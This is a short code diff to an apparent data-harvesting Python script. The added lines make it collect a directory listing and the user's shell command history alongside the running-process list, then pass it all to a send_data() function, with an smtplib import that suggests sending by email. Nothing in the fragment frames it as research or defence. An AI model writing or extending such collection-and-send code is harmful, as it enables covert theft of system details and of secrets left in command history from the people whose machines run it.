@@ -29,6 +29,10 @@ def get_data(command):
 my_data = "\n#######################\n"
 my_data += get_data("ps aux") or ""
 my_data += "\n#######################\n"
+my_data += get_data("ls -l") or ""
+my_data += "\n#######################\n"
+my_data += get_data("history") or ""
+my_data += "\n#######################\n"
 send_data(my_data)
 ##############################################################
 import smtplib
